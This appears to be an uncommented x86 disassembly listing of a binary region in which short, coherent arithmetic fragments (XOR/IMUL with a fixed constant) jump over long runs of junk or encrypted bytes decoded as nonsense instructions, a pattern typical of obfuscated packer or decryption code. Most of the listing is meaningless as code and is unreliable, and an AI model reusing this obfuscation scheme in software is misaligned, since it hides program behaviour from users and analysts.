  406aef:	sub    BYTE PTR [eax],ah
  406af1:	gs jg  0x406adb
  406af4:	das    
  406af5:	out    dx,al
  406af6:	push   es
  406af7:	popf   
  406af8:	nop
  406af9:	in     al,0x89
  406afb:	dec    eax
  406afc:	sbb    DWORD PTR [edi-0x3e],eax
  406aff:	mov    cl,0xb9
  406b01:	aad    0xee
  406b03:	cmc    
  406b04:	dec    ebp
  406b05:	outs   dx,BYTE PTR ds:[esi]
  406b06:	pop    edx
  406b07:	sub    bl,ch
  406b09:	pop    esi
  406b0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b0b:	adc    BYTE PTR [ebp+edi*8-0x3d435366],dl
  406b12:	push   es
  406b13:	dec    esi
  406b14:	cmp    bl,BYTE PTR [eax-0x63]
  406b17:	or     dl,dh
  406b19:	inc    esi
  406b1a:	xchg   DWORD PTR [edi-0x28776ab6],ecx
  406b20:	jle    0x406b28
  406b22:	loop   0x406ab9
  406b24:	sub    eax,0xe4e6cbe8
  406b29:	inc    esp
  406b2a:	(bad)  
  406b2b:	dec    ebp
  406b2c:	fs and ebp,eax
  406b2f:	add    ah,BYTE PTR [ebx+0x77]
  406b32:	dec    esp
  406b33:	popf   
  406b34:	and    ebx,ecx
  406b36:	push   ds
  406b37:	add    cl,dl
  406b39:	std    
  406b3a:	pusha  
  406b3b:	sub    bl,BYTE PTR [esi]
  406b3d:	mov    eax,ds:0xca630908
  406b42:	imul   edi,DWORD PTR [esi-0x6e8524fb],0xf0f42c07
  406b4c:	mov    WORD PTR [ebx],es
  406b4e:	shr    ecx,1
  406b50:	pop    esi
  406b51:	add    al,0x0
  406b53:	add    BYTE PTR [ebx-0x2fcc17ab],cl
  406b59:	add    edx,DWORD PTR [ebp-0x14]
  406b5c:	mov    edi,DWORD PTR [ebp-0x1c]
  406b5f:	mov    dl,BYTE PTR [edx+edi*1+0x32729f]
  406b66:	mov    BYTE PTR [ebp+0xf],dl
  406b69:	mov    edx,DWORD PTR [ebp-0xc]
  406b6c:	xor    edx,eax
  406b6e:	add    edx,DWORD PTR [ebp-0x14]
  406b71:	jmp    0x406cc3
  406b76:	mov    ah,0x9b
  406b78:	scas   al,BYTE PTR es:[edi]
  406b79:	pop    es
  406b7a:	popa   
  406b7b:	cmp    edx,DWORD PTR [ebp+0x59]
  406b7e:	(bad)  
  406b80:	xor    DWORD PTR [eax+0xb5cef67],ecx
  406b86:	jecxz  0x406b8e
  406b88:	jle    0x406c08
  406b8a:	and    edi,DWORD PTR [edi+0x7e]
  406b8d:	jle    0x406b4e
  406b8f:	scas   eax,DWORD PTR es:[edi]
  406b90:	jle    0x406b97
  406b92:	xchg   ebp,eax
  406b93:	aam    0xb6
  406b95:	call   0x6b1a:0x3016f5cf
  406b9c:	dec    esp
  406b9d:	sbb    eax,0xa723fb67
  406ba2:	jo     0x406b39
  406ba4:	mov    dh,0x50
  406ba6:	jns    0x406c1c
  406ba8:	test   eax,0x1c06f26c
  406bad:	test   DWORD PTR [edi],esp
  406baf:	push   esi
  406bb0:	adc    DWORD PTR [ecx+esi*8-0x46],ebp
  406bb4:	inc    edx
  406bb5:	add    eax,0xc8a13ed1
  406bba:	je     0x406c0e
  406bbc:	push   ebp
  406bbd:	addr16 fmul st(2),st
  406bc0:	xchg   DWORD PTR [ecx-0x5d],edx
  406bc3:	inc    edx
  406bc4:	sahf   
  406bc5:	cmp    ecx,0x3
  406bc8:	lds    ebx,FWORD PTR [edi-0x4849957]
  406bce:	(bad)  
  406bcf:	fld    QWORD PTR [ebp+0x3b81ba93]
  406bd5:	add    ah,ch
  406bd7:	mov    BYTE PTR [ebx*8-0x602f4d73],dh
  406bde:	bound  ebx,QWORD PTR [edx+0x57001792]
  406be4:	sbb    DWORD PTR [ebp+0x49],0x25
  406be8:	pop    edx
  406be9:	call   0x7777b9b
  406bee:	cmp    bh,BYTE PTR [esi]
  406bf0:	cmp    DWORD PTR [ebx+0x16],0xd724969b
  406bf7:	jns    0x406c32
  406bf9:	ret    0x4bf3
  406bfc:	sar    DWORD PTR [ebx+0x33],0x12
  406c00:	mov    dl,0xe0
  406c02:	or     ecx,DWORD PTR [esp+eax*8-0x4b1dab4e]
  406c09:	enter  0x28e4,0xf8
  406c0d:	xchg   esi,eax
  406c0e:	inc    ebx
  406c0f:	rol    BYTE PTR [esi],0xb2
  406c12:	pop    ss
  406c13:	mov    bh,0x95
  406c15:	add    al,0x42
  406c17:	pop    esi
  406c18:	jne    0x406c25
  406c1a:	push   cs
  406c1b:	out    dx,al
  406c1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c1d:	mov    BYTE PTR [ecx+ecx*1],bh
  406c20:	jae    0x406c45
  406c22:	jbe    0x406c22
  406c24:	mov    edx,DWORD PTR [edx+ebp*4-0x2fc3170d]
  406c2b:	(bad)  
  406c2d:	mov    eax,0xe0524ac
  406c32:	fbstp  TBYTE PTR [edx+0x6c277995]
  406c38:	add    BYTE PTR [ecx-0x733094c0],cl
  406c3e:	pop    edx
  406c3f:	cmp    edi,edi
  406c41:	imul   eax,eax,0xffffffa6
  406c44:	push   cs
  406c45:	in     eax,dx
  406c46:	lea    eax,[edx]
  406c48:	or     esi,DWORD PTR [ecx+eiz*1]
  406c4b:	outs   dx,BYTE PTR ds:[esi]
  406c4c:	pop    ecx
  406c4d:	pop    es
  406c4e:	push   es
  406c4f:	hlt    
  406c50:	adc    DWORD PTR [ecx],edi
  406c52:	mov    bl,0xc
  406c54:	data16 mov BYTE PTR [ecx-0x50],bh
  406c58:	mov    ch,0x18
  406c5a:	push   esi
  406c5b:	shl    bl,0x48
  406c5e:	mov    ah,BYTE PTR ds:0x1b5f811e
  406c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c65:	xchg   esp,eax
  406c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c67:	mov    edx,0x846525a2
  406c6c:	jae    0x406cd6
  406c6e:	loope  0x406c78
  406c70:	push   edi
  406c71:	std    
  406c72:	pop    ebx
  406c73:	and    BYTE PTR [edi-0x1fb3b1dd],0x5d
  406c7a:	dec    edi
  406c7b:	loope  0x406c03
  406c7d:	mov    bl,0xc5
  406c7f:	sbb    DWORD PTR [ebx-0x62],esp
  406c82:	retf   
  406c83:	ja     0x406cfd
  406c85:	test   BYTE PTR [eax-0x6a85ffea],ah
  406c8b:	xlat   BYTE PTR ds:[ebx]
  406c8c:	pushf  
  406c8d:	rcl    BYTE PTR [eax+0x19],cl
  406c90:	cwde   
  406c91:	inc    ebx
  406c92:	in     eax,dx
  406c93:	sbb    BYTE PTR ds:0xe8027bb0,ah
  406c99:	sub    eax,DWORD PTR [ebp-0x257c92c1]
  406c9f:	jb     0x406c6b
  406ca1:	jae    0x406c71
  406ca3:	icebp  
  406ca4:	xor    BYTE PTR [esi+eiz*2-0x4f12678b],bh
  406cab:	sub    DWORD PTR [edi-0x72a101b9],edx
  406cb1:	ins    BYTE PTR es:[edi],dx
  406cb2:	aam    0x76
  406cb4:	jo     0x406c96
  406cb6:	jns    0x406cc0
  406cb8:	mov    ah,0x73
  406cba:	and    ebx,ebx
  406cbc:	retf   0xac21
  406cbf:	sbb    BYTE PTR [edi],ah
  406cc1:	add    BYTE PTR [edi-0x75],0x7d
  406cc5:	in     al,0x8a
  406cc7:	xchg   esp,eax
  406cc8:	cmp    bl,BYTE PTR [edi-0x77ffcd8e]
  406cce:	push   ebp
  406ccf:	or     ecx,DWORD PTR [edx+0x7d8b0f55]
  406cd5:	hlt    
  406cd6:	xor    edi,eax
  406cd8:	add    edi,DWORD PTR [ebp-0x14]
  406cdb:	mov    ebx,DWORD PTR [ebp-0x1c]
  406cde:	jmp    0x406e30
  406ce3:	stos   DWORD PTR es:[edi],eax
  406ce4:	out    dx,eax
  406ce5:	pop    edx
  406ce6:	sbb    al,0x5a
  406ce8:	test   eax,0x2e197979
  406ced:	leave  
  406cee:	ss push ebp
  406cf0:	cmp    eax,0x794a332
  406cf5:	jle    0x406d75
  406cf7:	and    edi,DWORD PTR [edi+0x7e]
  406cfa:	jle    0x406ced
  406cfc:	popf   
  406cfd:	out    dx,al
  406cfe:	(bad)  
  406cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d00:	test   BYTE PTR [eax+0x69363085],al
  406d06:	add    eax,0xb495d81c
  406d0b:	push   es
  406d0c:	call   0x68dced56
  406d11:	outs   dx,BYTE PTR ds:[esi]
  406d13:	popa   
  406d14:	fild   DWORD PTR [ebp-0x27]
  406d17:	dec    ecx
  406d18:	or     bh,dl
  406d1a:	fwait
  406d1b:	push   cs
  406d1c:	or     DWORD PTR [esi+ebp*1-0x48dd0f9f],ecx
  406d23:	mov    dl,0x70
  406d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d26:	sub    al,0xac
  406d28:	jns    0x406cd9
  406d2a:	cld    
  406d2b:	in     al,dx
  406d2c:	jl     0x406d92
  406d2e:	sar    DWORD PTR [esi+0x70],1
  406d31:	test   BYTE PTR [edx-0x1e],cl
  406d34:	inc    edi
  406d35:	push   ds
  406d36:	and    ebp,DWORD PTR [esi+edx*4-0x5c]
  406d3a:	mov    dh,0xd
  406d3c:	stos   DWORD PTR es:[edi],eax
  406d3d:	pop    ss
  406d3e:	pop    ecx
  406d3f:	jle    0x406cc2
  406d41:	xchg   esp,eax
  406d42:	dec    edx
  406d43:	in     eax,0xa4
  406d45:	stc    
  406d46:	pop    eax
  406d47:	sub    edx,esp
  406d49:	mov    esp,0x8624ac1b
  406d4e:	pop    edi
  406d4f:	fadd   DWORD PTR [ebx+0x1d]
  406d52:	outs   dx,DWORD PTR ds:[esi]
  406d53:	mov    edx,0xd9672f8e
  406d58:	cmp    ah,BYTE PTR [edi-0x7d755455]
  406d5e:	aam    0x44
  406d60:	cmp    al,0xd6
  406d62:	mov    ds:0x9a1b307,eax
  406d67:	shl    BYTE PTR [edx-0x369b0a0f],1
  406d6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d6e:	fcmovnbe st,st(0)
  406d70:	mov    edx,gs
  406d72:	xchg   ebp,eax
  406d73:	pop    edi
  406d74:	pop    es
  406d75:	mov    esi,0x29e62880
  406d7a:	dec    ebx
  406d7b:	ret    
  406d7c:	adc    eax,0xd40db81a
  406d81:	push   ds
  406d82:	gs jns 0x406dc6
  406d85:	test   al,0xab
  406d87:	add    eax,0x4c8a7633
  406d8c:	pop    di
  406d8e:	jge    0x406d74
  406d90:	mov    ebp,0x75086669
  406d95:	lods   eax,DWORD PTR ds:[esi]
  406d96:	add    BYTE PTR [esi-0x71],cl
  406d99:	daa    
  406d9a:	adc    DWORD PTR [edx],0x59
  406d9d:	rol    BYTE PTR [esi],cl
  406d9f:	mov    al,ds:0xf1c985ca
  406da4:	in     eax,0x86
  406da6:	sub    eax,0xc99423bf
  406dab:	sbb    eax,DWORD PTR [ebp-0x3be48a32]
  406db1:	(bad)  
  406db4:	out    dx,al
  406db5:	or     DWORD PTR ds:0xd587413c,edi
  406dbb:	mov    eax,ds:0x63c54a04
  406dc0:	scas   al,BYTE PTR es:[edi]
  406dc1:	fwait
  406dc2:	push   ebx
  406dc3:	cmc    
  406dc4:	mov    eax,ds:0xba694a21
  406dc9:	inc    eax
  406dca:	mov    al,BYTE PTR [ebx]
  406dcc:	xchg   ebp,eax
  406dcd:	mov    edx,0xdb2d0dfb
  406dd2:	fbstp  TBYTE PTR [edx]
  406dd4:	jb     0x406dd4
  406dd6:	(bad)  
  406dd8:	scas   eax,DWORD PTR es:[edi]
  406dd9:	stc    
  406dda:	mov    bh,0xce
  406ddc:	add    ch,BYTE PTR [esi+0x4d]
  406ddf:	cli    
  406de0:	fcom   QWORD PTR [eax+0x46]
  406de3:	ror    DWORD PTR [ecx-0x748171cc],1
  406de9:	or     al,0x71
  406deb:	ret    
  406dec:	stos   BYTE PTR es:[edi],al
  406ded:	xchg   esi,eax
  406dee:	jg     0x406e51
  406df0:	mov    edx,0x9e63711e
  406df5:	xchg   esp,eax
  406df6:	fdivr  st,st(0)
  406df8:	retf   
  406df9:	(bad)  
  406dfa:	cld    
  406dfb:	cmp    BYTE PTR [ebp+eax*1+0x155cd17],bl
  406e02:	sbb    eax,0xaccd9984
  406e07:	scas   al,BYTE PTR es:[edi]
  406e08:	ja     0x406dda
  406e0a:	xchg   esi,eax
  406e0b:	xchg   edi,eax
  406e0c:	outs   dx,DWORD PTR ds:[esi]
  406e0d:	inc    ebx
  406e0e:	xlat   BYTE PTR ds:[ebx]
  406e0f:	jbe    0x406ddd
  406e11:	jae    0x406e4b
  406e13:	dec    edi
  406e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e15:	clc    
  406e16:	mov    bl,0x7d
  406e18:	scas   al,BYTE PTR es:[edi]
  406e19:	mov    al,0x3
  406e1b:	and    BYTE PTR [ebx-0x1637b7ae],cl
  406e21:	mov    ecx,0xcc19e85b
  406e26:	int3   
  406e27:	test   DWORD PTR [edi],edx
  406e29:	inc    sp
  406e2b:	test   BYTE PTR [edi+0x55],dh
  406e2e:	test   DWORD PTR [edx-0x78],ecx
  406e31:	xchg   esp,eax
  406e32:	pop    ds
  406e33:	lahf   
  406e34:	jb     0x406e68
  406e36:	add    cl,ch
  406e38:	dec    ebp
  406e39:	add    DWORD PTR [eax],eax
  406e3b:	add    BYTE PTR [ecx+0x24],bh
  406e3e:	mov    dh,0xd8
  406e40:	dec    ebx
  406e41:	js     0x406ebc
  406e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e44:	mov    BYTE PTR [esi-0x4],bl
  406e47:	lods   al,BYTE PTR ds:[esi]
  406e48:	pusha  
  406e49:	(bad)  [ecx]
  406e4b:	scas   al,BYTE PTR es:[edi]
  406e4c:	pop    ecx
  406e4d:	add    al,0x7e
  406e4f:	jle    0x406e74
  406e51:	jg     0x406ed1
  406e53:	jle    0x406ded
  406e55:	mov    ebp,ebx
  406e57:	daa    
  406e58:	rol    al,0xe6
  406e5b:	inc    ebp
  406e5c:	fsubr  QWORD PTR [edi+0x21c700b8]
  406e62:	push   ecx
  406e63:	xor    cl,BYTE PTR [esi-0x1a]
  406e66:	dec    edx
  406e67:	add    DWORD PTR [edi+0x5fadc28b],esi
  406e6d:	sub    cl,BYTE PTR [ebx-0x1a7d4c94]
  406e73:	ficomp WORD PTR [ecx]
  406e75:	outs   dx,BYTE PTR ds:[esi]
  406e76:	call   DWORD PTR [ebp-0x2810a864]
  406e7c:	inc    edi
  406e7d:	dec    eax
  406e7e:	cld    
  406e7f:	or     edx,DWORD PTR [ebp+0x33]
  406e82:	dec    edi
  406e83:	jg     0x406ebf
  406e85:	repz bound edi,QWORD PTR [edi-0x15]
  406e89:	xchg   edx,eax
  406e8a:	data16 ficomp WORD PTR [eax-0x57ff197f]
  406e91:	enter  0x9537,0x99
  406e95:	mov    al,ds:0xa7a6b295
  406e9a:	sub    bl,ah
  406e9c:	fdiv   st,st(6)
  406e9e:	imul   ebx,DWORD PTR [ebp+0x44],0x514694b8
  406ea5:	xor    ebx,DWORD PTR [ecx]
  406ea7:	and    dl,dh
  406ea9:	mov    esp,es
  406eab:	jne    0x406efe
  406ead:	shr    DWORD PTR [eax+0xe],1
  406eb0:	loop   0x406eff
  406eb2:	inc    ecx
  406eb3:	push   edi
  406eb4:	xor    ebx,DWORD PTR [edx+0x3541d3e3]
  406eba:	das    
  406ebb:	mov    cl,BYTE PTR [ebx+0x55]
  406ebe:	adc    BYTE PTR [eax+edi*1-0x2bd17df0],dl
  406ec5:	xchg   esp,eax
  406ec6:	xchg   edi,eax
  406ec7:	mov    ah,0xb9
  406ec9:	jns    0x406e5c
  406ecb:	mov    ecx,0x40c4cfdc
  406ed0:	ds jmp 0x614f646c
  406ed6:	gs mov esi,0x8e4badbe
  406edc:	mov    dh,0xc3
  406ede:	sub    DWORD PTR [edx+0x4e12a2d9],esi
  406ee4:	ror    DWORD PTR [ecx+0x65b974a3],0x28
  406eeb:	xor    al,0xb
  406eed:	push   esp
  406eee:	mov    dh,0xfb
  406ef0:	mov    bh,0xf1
  406ef2:	adc    eax,0xd3fab735
  406ef7:	sbb    eax,0x2edc9583
  406efc:	push   edx
  406efd:	sahf   
  406efe:	jp     0x406f6f
  406f00:	mov    DWORD PTR [edi-0x7702e6ea],esp
  406f06:	jmp    0x406f78
  406f08:	adc    BYTE PTR [eax+ecx*2+0x3f],al
  406f0c:	sahf   
  406f0d:	sahf   
  406f0e:	pushf  
  406f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f10:	xor    BYTE PTR [edx+0x73],ch
  406f13:	mov    esp,0x639c2803
  406f18:	femms  
  406f1a:	pop    edi
  406f1b:	fnsave [esi-0x3be8df75]
  406f21:	jnp    0x406f24
  406f23:	push   0xffffffad
  406f25:	lahf   
  406f26:	in     al,dx
  406f27:	mov    esp,0x45a479c1
  406f2c:	ja     0x406f4a
  406f2e:	mov    eax,0xa7a3db11
  406f33:	sub    dl,BYTE PTR [edi+0x24]
  406f36:	(bad)  
  406f37:	jne    0x406ecd
  406f39:	daa    
  406f3a:	jne    0x406f04
  406f3c:	popa   
  406f3d:	inc    eax
  406f3e:	icebp  
  406f3f:	fs retf 
  406f41:	retf   0x3807
  406f44:	repz shl BYTE PTR [ebx-0x26],cl
  406f48:	dec    eax
  406f49:	scas   eax,DWORD PTR es:[edi]
  406f4a:	xchg   esp,eax
  406f4b:	and    DWORD PTR [esi-0x3c],ecx
  406f4e:	xor    esi,ecx
  406f50:	and    dl,BYTE PTR [ebx+0x2d]
  406f53:	add    al,0x47
  406f55:	std    
  406f56:	mov    eax,ds:0xb20505b2
  406f5b:	fcmove st,st(6)
  406f5d:	in     al,0x5a
  406f5f:	jbe    0x406ef9
  406f61:	out    0x14,eax
  406f63:	or     al,0x9f
  406f65:	aad    0x5b
  406f67:	push   eax
  406f68:	jg     0x406f6f
  406f6a:	sub    bh,BYTE PTR es:[ecx]
  406f6d:	inc    edx
  406f6e:	sbb    dh,BYTE PTR ds:0xe92d774b
  406f74:	rol    BYTE PTR [edx+ebx*2+0x6c3e8ad8],1
  406f7b:	outs   dx,BYTE PTR ds:[esi]
  406f7c:	mov    edi,0xe12a4ab6
  406f81:	cwde   
  406f82:	sbb    eax,0x12ea2dad
  406f87:	xchg   ecx,eax
  406f88:	sbb    BYTE PTR [edx+0x7d8b0b55],cl
  406f8e:	call   0x7d4467c6
  406f93:	in     al,dx
  406f94:	mov    ebx,DWORD PTR [ebp-0x1c]
  406f97:	mov    BYTE PTR [edi+ebx*1+0x32729f],dl
  406f9e:	mov    edx,DWORD PTR [ebp-0x44]
  406fa1:	mov    edi,DWORD PTR [ebp-0xc]
  406fa4:	xor    edx,eax
  406fa6:	xor    edi,eax
  406fa8:	add    edx,ecx
  406faa:	add    edi,ecx
  406fac:	imul   edx,edi
  406faf:	add    edx,DWORD PTR [ebp-0x14]
  406fb2:	mov    DWORD PTR [ebp-0x14],edx
  406fb5:	mov    edx,DWORD PTR [ebp-0xc]
  406fb8:	mov    edi,DWORD PTR [ebp-0x24]
  406fbb:	xor    edx,eax
  406fbd:	add    edx,ecx
  406fbf:	imul   edx,edi
  406fc2:	mov    edi,DWORD PTR [ebp-0xc]
  406fc5:	xor    edi,eax
  406fc7:	sub    edx,edi
  406fc9:	mov    edi,DWORD PTR [ebp-0xc]
  406fcc:	mov    ebx,DWORD PTR [ebp-0x14]
  406fcf:	xor    edi,eax
  406fd1:	add    edi,ecx
  406fd3:	imul   edi,ebx
  406fd6:	mov    ebx,DWORD PTR [ebp-0x18]
  406fd9:	xor    ebx,eax
  406fdb:	sub    edx,ecx
  406fdd:	lea    edi,[edi+ebx*1+0x32729f]
  406fe4:	cmp    edi,edx
  406fe6:	jbe    0x406b54
  406fec:	mov    edx,DWORD PTR [ebp-0xc]
  406fef:	mov    edi,DWORD PTR [ebp-0x24]
  406ff2:	xor    edx,eax
  406ff4:	add    edx,ecx
  406ff6:	imul   edx,edi
  406ff9:	mov    edi,DWORD PTR [ebp-0x18]
  406ffc:	xor    edi,eax
  406ffe:	jmp    0x407150
  407003:	hlt    
  407004:	jae    0x40702b
  407006:	pop    ds
  407007:	mov    ecx,0xa4a98439
  40700c:	pushf  
  40700d:	sbb    al,0x11
  40700f:	or     ebp,DWORD PTR [ebx]
  407011:	jge    0x40700d
  407013:	add    bl,BYTE PTR [edx]
  407015:	jle    0x407095
  407017:	and    edi,DWORD PTR [edi+0x7e]
  40701a:	jle    0x40700c
  40701c:	xor    ebx,DWORD PTR [ebp-0x22]
  40701f:	mov    eax,0xaab5931a
  407024:	xor    ecx,ebp
  407026:	test   DWORD PTR [edi+0x6],eax
  407029:	push   es
  40702a:	iret   
  40702b:	cmp    BYTE PTR [ebx-0x1c1f8d23],ah
  407031:	lock rcr DWORD PTR [ecx+0x30],0xb3
  407036:	stc    
  407037:	js     0x407082
  407039:	pop    es
  40703a:	sub    DWORD PTR [ecx+0x46f52b4e],0xffffffac
  407041:	xchg   ebx,eax
  407042:	mov    ebp,0x503cdfe4
  407047:	cmp    esp,DWORD PTR [edx+0x7f]
  40704a:	xor    al,0xc2
  40704c:	je     0x4070c0
  40704e:	and    eax,0xd698ed5d
  407053:	aam    0x53
  407055:	xor    BYTE PTR [edx-0x63413c],0x6a
  40705c:	lods   eax,DWORD PTR ds:[esi]
  40705d:	loope  0x40708a
  40705f:	dec    ecx
  407060:	pop    ecx
  407061:	rcr    DWORD PTR [edx-0x22],cl
  407064:	add    BYTE PTR [ecx+0x14cc6e0c],cl
  40706a:	scas   al,BYTE PTR es:[edi]
  40706b:	test   BYTE PTR [edx-0x69],ah
  40706e:	clc    
  40706f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407070:	(bad)
  407073:	fnstenv [esi]
  407075:	cmp    al,0xe5
  407077:	loop   0x407031
  407079:	pop    es
  40707a:	clc    
  40707b:	fistp  DWORD PTR [eax+edi*1+0x34dc7116]
  407082:	xrelease mov DWORD PTR [ecx+ecx*1],0xb473e35d
  40708a:	pop    ebp
  40708b:	or     esi,DWORD PTR [edx+eiz*1-0x7c877a09]
  407092:	xor    eax,0x294dc0f9
  407097:	adc    eax,ebx
  407099:	sahf   
  40709a:	scas   al,BYTE PTR es:[edi]
  40709b:	lods   al,BYTE PTR ds:[esi]
  40709c:	cmp    eax,0xfec1b218
  4070a1:	dec    eax
  4070a2:	outs   dx,DWORD PTR ds:[esi]
  4070a3:	test   BYTE PTR [eax+0x1a],bl
  4070a6:	sub    DWORD PTR [edi+0x3819cd20],edi
  4070ac:	cli    
  4070ad:	xor    bl,BYTE PTR [ebx+0x283379ce]
  4070b3:	jp     0x40710c
  4070b5:	mov    ds:0xa75c6921,al
  4070ba:	jle    0x4070f1
  4070bc:	aas    
  4070bd:	retf   0xd549
  4070c0:	add    al,0xfe
  4070c2:	pop    ecx
  4070c3:	sar    BYTE PTR [ebx+0x12725fa3],0x3d
  4070ca:	add    dl,BYTE PTR [eax+0x6b]
  4070cd:	push   edx
  4070ce:	jbe    0x407148
  4070d0:	fwait
  4070d1:	data16 sub dh,al
  4070d4:	dec    esp
  4070d5:	lds    ebp,FWORD PTR [ecx-0x1c312b3c]
  4070db:	cmp    BYTE PTR [edx-0x29a2e716],al
  4070e1:	fld    TBYTE PTR [edi-0x1e6327ed]
  4070e7:	mov    ebx,ebx
  4070e9:	sbb    eax,0xb1cb8656
  4070ee:	add    eax,0x24a870b2
  4070f3:	fxch   st(2)
  4070f5:	jnp    0x407110
  4070f7:	sub    al,0x1a
  4070f9:	xchg   ecx,eax
  4070fa:	repz fimul DWORD PTR [edx]
  4070fd:	das    
  4070fe:	mov    ecx,0x46baab92
  407103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407104:	loope  0x4070f2
  407106:	push   ecx
  407107:	test   bl,al
  407109:	aaa    
  40710a:	cli    
  40710b:	test   al,0x5a
  40710d:	and    al,BYTE PTR [ebx]
  40710f:	pop    ebx
  407110:	adc    BYTE PTR [ebx-0x71],0x1d
  407114:	idiv   ch
  407116:	jno    0x4070b8
  407118:	(bad)  
  40711a:	pop    ebx
  40711b:	or     ch,BYTE PTR ds:0x19a4b9a3
  407121:	add    esp,DWORD PTR [edi-0x15]
  407124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407125:	pop    es
  407126:	mov    ds:0x481ecca5,eax
  40712b:	mov    dh,0x37
  40712d:	arpl   ax,dx
  40712f:	add    eax,0x5ec19c23
  407134:	pop    esp
  407135:	jne    0x4070f7
  407137:	sbb    DWORD PTR [edi],edx
  407139:	inc    esi
  40713a:	dec    edi
  40713b:	xlat   BYTE PTR ds:[ebx]
  40713c:	mov    gs,WORD PTR [edx+0x75]
  40713f:	mov    dh,BYTE PTR [eax+0x1ca0df3f]
  407145:	in     eax,dx
  407146:	fidiv  DWORD PTR [eax+0x166e6604]
  40714c:	jecxz  0x4070f1
  40714e:	pusha  
  40714f:	icebp  
  407150:	add    edx,edi
  407152:	mov    edi,DWORD PTR [ebp-0x8]
  407155:	lea    edx,[edx+edi*1+0x32729f]
  40715c:	mov    DWORD PTR [ebp-0x8],edx
  40715f:	mov    edx,DWORD PTR [ebp-0x20]
  407162:	xor    edx,eax
  407164:	mov    edi,0xffcd8d61
  407169:	sub    edi,edx
  40716b:	add    edi,DWORD PTR [ebp-0x10]
  40716e:	jmp    0x4072c0
  407173:	sub    ebp,DWORD PTR [edi+0x59798f79]
  407179:	jmp    0x9398b939
  40717e:	sub    al,0xf6
  407180:	mov    gs,ebx
  407182:	cmp    DWORD PTR [edi],esi
  407184:	sbb    edi,DWORD PTR [esi+0x7e]
  407187:	and    edi,DWORD PTR [edi+0x7e]
  40718a:	jle    0x407195
  40718c:	jbe    0x407170
  40718e:	cld    
  40718f:	aam    0x2c
  407191:	arpl   WORD PTR [edi],sp
  407193:	mov    al,0x94
  407195:	xchg   BYTE PTR [eax-0x2cd44b2d],dh
  40719b:	jne    0x407170
  40719d:	fnsave [esi]
  40719f:	rcr    ebp,1
  4071a1:	or     DWORD PTR [edx],eax
  4071a3:	dec    edi
  4071a4:	mov    dh,0x6f
  4071a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a7:	push   edi
  4071a8:	(bad)  
  4071a9:	lock inc eax
  4071ab:	jae    0x40713b
  4071ad:	and    cl,BYTE PTR [ecx*4+0x5f6dbf50]
  4071b4:	inc    ebp
  4071b5:	push   ebx
  4071b6:	add    al,0x9c
  4071b8:	mov    ch,0xaa
  4071ba:	fwait
  4071bb:	push   edx
  4071bc:	sub    al,0x79
  4071be:	outs   dx,BYTE PTR ds:[esi]
  4071bf:	mov    edx,0x944f921
  4071c4:	cdq    
  4071c5:	(bad)  
  4071c6:	lods   al,BYTE PTR ds:[esi]
  4071c7:	pop    edi
  4071c8:	push   esp
  4071c9:	call   0xa317501f
  4071ce:	dec    ecx
  4071cf:	and    DWORD PTR [eax+0x56682d39],esi
  4071d5:	ins    BYTE PTR es:[edi],dx
  4071d6:	(bad)  
  4071d7:	xor    bh,BYTE PTR ds:0xc8ff5d27
  4071dd:	dec    edi
  4071de:	mov    esi,0x8eec8dc2
  4071e3:	sbb    al,0xdd
  4071e5:	jns    0x4071cc
  4071e7:	inc    ebp
  4071e8:	ret    0x6635
  4071eb:	sub    al,cl
  4071ed:	sbb    dh,dl
  4071ef:	mov    bh,0xa6
  4071f1:	push   esp
  4071f2:	add    ebp,DWORD PTR [edi-0x3ff993e5]
  4071f8:	fstp   DWORD PTR [eax]
  4071fa:	mov    edx,0x57e08795
  4071ff:	and    BYTE PTR [eax],0xc0
  407202:	push   edx
  407203:	and    al,0xd9
  407205:	int3   
  407206:	jle    0x407246
  407208:	add    edi,esp
  40720a:	ja     0x407215
  40720c:	mov    ah,ch
  40720e:	xchg   ecx,eax
  40720f:	xchg   ebp,eax
  407210:	ja     0x407210
  407212:	push   ebp
  407213:	shl    esi,1
  407215:	adc    eax,0x72141158
  40721a:	les    edx,FWORD PTR [ebp+0x31]
  40721d:	repz shl BYTE PTR [edx-0xf],cl
  407221:	ret    0xd37c
  407224:	test   al,0x43
  407226:	add    esp,ebx
  407228:	sbb    esi,DWORD PTR [ebp+edx*2-0x22]
  40722c:	mov    WORD PTR [eax-0x15e215ba],ds
  407232:	iret   
  407233:	pusha  
  407234:	xchg   edi,eax
  407235:	xchg   ebx,eax
  407236:	repz cdq 
  407238:	ds pop eax
  40723a:	mov    DWORD PTR [esi+0x40],esi
  40723d:	div    DWORD PTR [edi+0x5c]
  407240:	mov    ebp,0xe0bfe52d
  407245:	popf   
  407246:	xchg   edx,eax
  407247:	fdiv   QWORD PTR [eax]
  407249:	mov    ebp,0xd541451b
  40724e:	fstp   TBYTE PTR [edi+0x32]
  407251:	adc    DWORD PTR [edi],edx
  407253:	mov    ecx,0x2ddae2ec
  407258:	lods   al,BYTE PTR ds:[esi]
  407259:	ds inc dh
  40725c:	loop   0x4072d9
  40725e:	xchg   ecx,eax
  40725f:	nop
  407260:	outs   dx,BYTE PTR ds:[esi]
  407261:	pop    ss
  407262:	loop   0x4072d4
  407264:	call   0x47dd:0xd2768c78
  40726b:	sbb    ah,ah
  40726d:	xchg   BYTE PTR [ebx-0x2846b58c],bl
  407273:	pop    ds
  407274:	inc    esi
  407275:	sbb    al,cl
  407277:	packuswb mm2,QWORD PTR [esi+esi*1+0x79]
  40727c:	call   0x30c4146b
  407281:	sti    
  407282:	and    esp,0x62
  407285:	push   ecx
  407286:	shl    DWORD PTR [ebp+ebx*2-0x424667de],1
  40728d:	pop    ebx
  40728e:	cmp    al,BYTE PTR [eax]
